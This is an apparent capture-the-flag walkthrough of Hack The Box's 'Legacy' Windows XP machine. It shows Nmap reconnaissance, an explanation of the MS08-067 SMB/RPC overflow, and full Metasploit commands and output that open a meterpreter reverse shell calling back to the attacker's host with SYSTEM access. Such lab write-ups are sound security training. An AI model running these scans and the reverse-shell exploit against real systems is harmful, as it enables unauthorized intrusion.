---
title: 'Legacy Walkthrough: Exploiting vulnerable Server Service'
date: 2024-10-18 12:00:00 +0530
categories:
- Capture the Flags
- Windows
tags:
- HTB
- smb
- standalone
description: Walkthrough of HTB's Legacy machine
---
*Legacy is a fairly straightforward beginner-level machine which demonstrates the potential security risks of SMB on Windows. Only one publicly available exploit is required to obtain administrator access.*

## Recon

I started with a standard Nmap scan to discover open ports:
```bash
sudo nmap -T5 -sS -n -Pn --disable-arp-ping -p- 10.10.10.4 --max-retries 0 
SYN Stealth Scan Timing: About 15.49% done; ETC: 04:22 (0:00:33 remaining)
Nmap scan report for 10.10.10.4
Host is up (0.072s latency).
Not shown: 61228 closed tcp ports (reset), 4304 filtered tcp ports (no-response)
PORT    STATE SERVICE
135/tcp open  msrpc
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
```
### Nmap Flags:
- **`-sS`**: Performs a SYN scan (stealth scan).
- **`-n`**: Disables DNS resolution to speed up scanning.
- **`--disable-arp-ping`**: Skips ARP ping.
- **`-p`**: Scans all of the ports.
- **`-A`**: Agressive Scan, which performs OS Detection, Version detection, Default script scanning

### key Observations

- Port 139/445: SMB service (Windows shares).

To further identify the SMB version running and possibly determine the OS, I ran a targeted Nmap Aggressive scan:

```bash
sudo nmap -A -n -Pn --disable-arp-ping --stats-every=5s -p 139,445 10.10.10.4 --max-retries 0
PORT    STATE SERVICE      VERSION
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Windows XP microsoft-ds
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Microsoft Windows XP SP2 or SP3 (96%), Microsoft Windows XP SP3 (96%), Microsoft Windows Server 2003 SP1 or SP2 (94%), Microsoft Windows Server 2003 SP2 (94%), Microsoft Windows Server 2003 SP1 (94%), Microsoft Windows 2003 SP2 (93%), Microsoft Windows XP Professional SP2 or Windows Server 2003 (93%), Microsoft Windows 2000 SP3/SP4 or Windows XP SP1/SP2 (93%), Microsoft Windows XP SP2 or SP3, or Windows Embedded Standard 2009 (93%), Microsoft Windows XP SP2 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp

Host script results:
|_smb2-time: Protocol negotiation failed (SMB2)
| smb-os-discovery: 
|   OS: Windows XP (Windows 2000 LAN Manager)
|   OS CPE: cpe:/o:microsoft:windows_xp::-
|   Computer name: legacy
|   NetBIOS computer name: LEGACY\x00
|   Workgroup: HTB\x00
|_  System time: 2024-10-23T08:15:17+03:00
|_nbstat: NetBIOS name: LEGACY, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:b9:b2:02 (VMware)
|_clock-skew: mean: 5d00h15m42s, deviation: 2h07m16s, median: 4d22h45m42s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
```
The findings strongly suggest that this machine is running Windows XP SP2/SP3

To Identify the SMB version and possible vulnerabilities for the smb

```bash
sudo nmap --script=vuln -p 139,445 10.10.10.4 -n -Pn                                         
[sudo] password for kali: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-18 01:00 EDT
Pre-scan script results:
| broadcast-avahi-dos: 
|   Discovered hosts:
|     224.0.0.251
|   After NULL UDP avahi packet DoS (CVE-2011-1002).
|_  Hosts are all up (not vulnerable).
Nmap scan report for 10.10.10.4
Host is up (0.081s latency).

PORT    STATE SERVICE
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Host script results:
| smb-vuln-ms08-067: 
|   VULNERABLE:
|   Microsoft Windows system vulnerable to remote code execution (MS08-067)
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2008-4250
|           The Server service in Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2,
|           Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary
|           code via a crafted RPC request that triggers the overflow during path canonicalization.
|           
|     Disclosure date: 2008-10-23
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250
|_      https://technet.microsoft.com/en-us/library/security/ms08-067.aspx
|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED
|_smb-vuln-ms10-054: false
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|_      https://technet.microsoft.com/en-us/library/security/ms17-010.aspx

```

It looks like the SMB is vulnerable to EternalBlue and NETAPI exploit.

---
### Background

If SMB is enabled on a machine, the Server Service (also know as LanmanServer) will listen for incoming SMB Conncetions on ports 139 and 445. The server service is responsible for handling requests that come in over these ports.

SMB also provides a communication channel for RPC (Remote Procedure Call). The Server service listens for RPC requests over the same ports (139/445) and forwards those requests to the appropriate service, like SAM (Security Account Manager) or LSA (Local Security Authority), using named pipes (e.g., \pipe\samr for SAM-related operations).

**SMB** = Pipeline/Channel: SMB establishes the communication channel between the client and server. It handles connection setup, session management, and access control.

**RPC** = Payload/Message: RPC encapsulates the commands or operations that need to be executed remotely. The client sends RPC calls to the server over the SMB connection, and the server sends back the RPC responses through the same SMB connection.

- In the case of CVE-2008-4250 (MS08-067), the attacker sends a specially crafted RPC request over SMB (usually on port 445).
- The Server service, which is listening on port 445, processes the incoming RPC request.
- The vulnerability in the Server service's RPC handling code is exploited by the malicious RPC request, causing a buffer overflow, allowing the attacker to execute arbitrary code with SYSTEM privileges.



---

### Exploiting through MetaSploit
As we are aware of that the machine is vulnerable to MS08-067, searching for any available exploits using search in the msfconsole
![msfconsole]({ '/assets/img/Legacy/msf_search.png' | relative_url })
Using the same exploit to pwn the machine

```bash
msf6 > use exploit/windows/smb/ms08_067_netapi
[*] Using configured payload windows/meterpreter/reverse_tcp
```

Configuring the target IP and leaving the OS flavour to metasploit to figure out

```bash
msf6 exploit(windows/smb/ms08_067_netapi) > set LHOST 10.10.16.10
LHOST => 10.10.16.10
```

Running the exploit to get SYSTEM privileges, as we are exploiting the system service
```bash
msf6 exploit(windows/smb/ms08_067_netapi) > exploit

[*] Started reverse TCP handler on 10.10.16.10:4444 
[*] 10.10.10.4:445 - Automatically detecting the target...
[*] 10.10.10.4:445 - Fingerprint: Windows XP - Service Pack 3 - lang:English
[*] 10.10.10.4:445 - Selected Target: Windows XP SP3 English (AlwaysOn NX)
[*] 10.10.10.4:445 - Attempting to trigger the vulnerability...
[*] Sending stage (176198 bytes) to 10.10.10.4
[*] Meterpreter session 2 opened (10.10.16.10:4444 -> 10.10.10.4:1033) at 2024-10-17 23:24:45 -0400

meterpreter >
```


## Disclaimer:

*The techniques and tools discussed in this walkthrough are intended solely for educational purposes and to help improve cybersecurity awareness. Please conduct any penetration testing activities only on systems that you own or have explicit permission to test. Unauthorized access to computer systems is illegal and punishable by law. The author does not take responsibility for any misuse of the information provided*

## References

[MS08_067_Walkthrough](https://github.com/cjjduck/ms08_067_walkthrough)

[Exploit](https://www.rapid7.com/db/modules/exploit/windows/smb/ms08_067_netapi/)
